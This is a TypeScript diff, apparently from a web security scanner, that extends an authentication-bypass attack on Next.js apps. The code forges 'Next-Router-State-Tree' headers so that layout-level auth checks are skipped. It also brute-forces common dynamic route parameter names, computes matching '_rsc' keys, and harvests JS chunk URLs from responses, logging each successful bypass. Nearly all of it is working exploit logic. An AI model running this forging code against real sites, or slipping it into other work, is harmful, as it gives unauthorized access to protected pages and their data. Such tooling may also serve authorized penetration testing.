@@ -9,16 +9,33 @@ const NEXT_REDIRECT_MARKER = "NEXT_REDIRECT";
 export type LeafMode = "page" | "metadata-only";
 
 /**
+ * A forged ancestor segment. A plain string claims a static path segment (e.g.
+ * `"dashboard"`) is mounted. `{ paramName, value }` claims a dynamic route segment (e.g.
+ * `app/organizations/[org]/layout.js`) is mounted — Next.js's `matchSegment` requires an
+ * exact `[paramName, value]` tuple for dynamic segments (a bare string never matches one),
+ * and a black-box crawl can't know the app's real param name, only the URL's literal value.
+ */
+export type AncestorSegment = string | { paramName: string; value: string };
+
+/** Converts one ancestor segment to its FlightRouterState wire representation. */
+const toSegmentRepr = (segment: AncestorSegment): string | [string, string, "d"] =>
+    typeof segment === "string" ? segment : [segment.paramName, segment.value, "d"];
+
+/** The literal URL path value of an ancestor segment, regardless of representation. */
+export const ancestorSegmentValue = (segment: AncestorSegment): string =>
+    typeof segment === "string" ? segment : segment.value;
+
+/**
  * Builds the `Next-Router-State-Tree` header value: a URL-encoded FlightRouterState
  * claiming every segment in `ancestorSegments` is already client-rendered, with the
  * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
  * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
  * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`.
  */
-export const buildStateTreeHeader = (ancestorSegments: string[], leafMode: LeafMode = "page"): string => {
+export const buildStateTreeHeader = (ancestorSegments: AncestorSegment[], leafMode: LeafMode = "page"): string => {
     let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
     for (let i = ancestorSegments.length - 1; i >= 0; i--) {
-        node = [ancestorSegments[i], { children: node }];
+        node = [toSegmentRepr(ancestorSegments[i]), { children: node }];
     }
     const tree = ["", { children: node }];
     return encodeURIComponent(JSON.stringify(tree));
@@ -71,13 +88,31 @@ export const computeLegacyRscKey = (
     return djb2Hash(input).toString(36).slice(0, 5);
 };
 
-/** Ancestor-segment claims worth trying per candidate path: first segment only, and every segment but the leaf. */
-export const buildAncestorAttempts = (pathSegments: string[]): string[][] => {
+/**
+ * Common dynamic route param names to guess when the last ancestor segment might be a
+ * dynamic route (e.g. `[org]`, `[id]`) rather than a static one. Bounded to keep the
+ * per-candidate request count small; a miss just falls through to the next guess.
+ */
+const COMMON_DYNAMIC_PARAM_NAMES = ["id", "slug", "org", "tenant", "username"] as const;
+
+/**
+ * Ancestor-segment claims worth trying per candidate path: first segment only, every
+ * segment but the leaf (both as plain static segments), and — for the latter, since a
+ * static-segment guess can never match a real dynamic route — the same set with its last
+ * segment additionally tried as each of `COMMON_DYNAMIC_PARAM_NAMES`.
+ */
+export const buildAncestorAttempts = (pathSegments: string[]): AncestorSegment[][] => {
     if (pathSegments.length === 0) return [];
-    const attempts: string[][] = [[pathSegments[0]]];
+    const attempts: AncestorSegment[][] = [[pathSegments[0]]];
     const allButLeaf = pathSegments.slice(0, -1);
-    if (allButLeaf.length > 0 && allButLeaf.join("/") !== attempts[0].join("/")) {
+    if (allButLeaf.length > 0 && allButLeaf.join("/") !== pathSegments[0]) {
         attempts.push(allButLeaf);
+
+        const withoutLastAncestor = allButLeaf.slice(0, -1);
+        const lastAncestorValue = allButLeaf[allButLeaf.length - 1];
+        for (const paramName of COMMON_DYNAMIC_PARAM_NAMES) {
+            attempts.push([...withoutLastAncestor, { paramName, value: lastAncestorValue }]);
+        }
     }
     return attempts;
 };
@@ -85,10 +120,22 @@ export const buildAncestorAttempts = (pathSegments: string[]): string[][] => {
 /** True when a Flight/RSC payload records a server-side redirect (the auth check actually ran). */
 export const containsNextRedirectMarker = (body: string): boolean => body.includes(NEXT_REDIRECT_MARKER);
 
-/** Extracts `_next/static/chunks/*.js` (including Turbopack `~`-separated names) references from a Flight payload body. */
+/**
+ * Extracts `static/chunks/*.js` (including Turbopack `~`-separated names) references from a
+ * Flight payload body. Real payloads encode these WITHOUT a `_next/` prefix — e.g.
+ * `4:I[3330,["614","static/chunks/app/dashboard/secret/page-<hash>.js"],"default"]` — the
+ * client resolves them against its own asset prefix at runtime. An optional literal
+ * `_next/` prefix is still matched for payload shapes that do include it.
+ */
 export const extractChunkPathsFromFlightBody = (body: string): string[] => {
-    const matches = body.matchAll(/\/?_next\/static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
+    const matches = body.matchAll(/(?:_next\/)?static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
     return [...new Set([...matches].map((m) => m[0]))];
+};
+
+/** Resolves an extracted chunk path (with or without a `_next/` prefix) to an absolute URL. */
+const resolveChunkUrl = (chunkPath: string, origin: string): string => {
+    const normalized = chunkPath.startsWith("_next/") ? chunkPath : `_next/${chunkPath}`;
+    return new URL(`/${normalized}`, origin).toString();
 };
 
 export interface RouterStateForgeResult {
@@ -111,16 +158,19 @@ interface ForgeAttemptResult {
     body: string;
 }
 
+/** Renders an ancestor-segment list back to its literal URL path, for the `Next-Url` header. */
+const ancestorsToPath = (ancestors: AncestorSegment[]): string => ancestors.map(ancestorSegmentValue).join("/");
+
 /** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
 const attemptForge = async (
     candidateUrl: string,
-    ancestors: string[],
+    ancestors: AncestorSegment[],
     leafMode: LeafMode,
     keyMode: RscKeyMode,
     timeout: number
 ): Promise<ForgeAttemptResult> => {
     const stateTree = buildStateTreeHeader(ancestors, leafMode);
-    const nextUrl = "/" + ancestors.join("/");
+    const nextUrl = "/" + ancestorsToPath(ancestors);
     const rscKey =
         keyMode === "legacy" ? computeLegacyRscKey(stateTree, nextUrl) : computeStrongRscKey(stateTree, nextUrl);
 
@@ -149,7 +199,7 @@ const attemptForge = async (
  */
 const attemptForgeWithKeyFallback = async (
     candidateUrl: string,
-    ancestors: string[],
+    ancestors: AncestorSegment[],
     leafMode: LeafMode,
     timeout: number
 ): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
@@ -198,9 +248,7 @@ const next_routerStateForge = async (
 
         const recordChunks = (body: string) => {
             for (const chunkPath of extractChunkPathsFromFlightBody(body)) {
-                newJsUrls.push(
-                    new URL(chunkPath.startsWith("/") ? chunkPath : `/${chunkPath}`, parsed.origin).toString()
-                );
+                newJsUrls.push(resolveChunkUrl(chunkPath, parsed.origin));
             }
         };
 
@@ -212,7 +260,7 @@ const next_routerStateForge = async (
             if (result.success) {
                 printMsg(
                     MSG.Run,
-                    `[✓] Forged next-router-state-tree bypass revealed content: ${candidateUrl} (claimed ancestor: /${ancestors.join("/")}, ${result.keyMode} _rsc key)`
+                    `[✓] Forged next-router-state-tree bypass revealed content: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
                 );
                 bypassedUrls.push(candidateUrl);
                 if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
@@ -228,7 +276,7 @@ const next_routerStateForge = async (
             if (result.success) {
                 printMsg(
                     MSG.Run,
-                    `[✓] Forged metadata-only next-router-state-tree bypass revealed metadata: ${candidateUrl} (claimed ancestor: /${ancestors.join("/")}, ${result.keyMode} _rsc key)`
+                    `[✓] Forged metadata-only next-router-state-tree bypass revealed metadata: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
                 );
                 metadataOnlyBypassedUrls.push(candidateUrl);
                 if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
